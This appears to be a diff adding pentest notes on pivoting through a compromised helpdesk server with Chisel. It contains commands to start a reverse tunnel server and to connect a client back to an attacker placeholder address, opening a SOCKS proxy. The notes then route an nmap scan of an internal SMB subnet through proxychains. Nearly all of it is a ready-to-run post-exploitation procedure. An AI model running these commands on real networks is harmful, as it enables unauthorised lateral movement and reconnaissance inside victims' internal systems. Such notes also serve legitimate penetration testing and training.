@@ -1,0 +1,19 @@
+# ==========================================
+# Network Pivoting via Chisel (SOCKS5 Proxy)
+# ==========================================
+
+# 1. On Attacker Machine (Start Chisel Server)
+# This opens port 8000 on our machine to listen for the connection from the compromised web server.
+chisel server -p 8000 --reverse
+
+# 2. On Compromised Helpdesk Server (Start Chisel Client)
+# Connect back to the attacker and open a reverse SOCKS proxy on port 1080.
+./chisel client [ATTACKER_IP]:8000 R:socks
+
+# 3. Proxychains Configuration (/etc/proxychains4.conf)
+# Add the following line at the end of the file to route tools through the tunnel:
+socks5 127.0.0.1 1080
+
+# 4. Usage Example
+# Now we can scan the ACCOUNT subnet (VLAN 20) through the proxy:
+proxychains nmap -sT -Pn -p 445 10.10.20.0/24
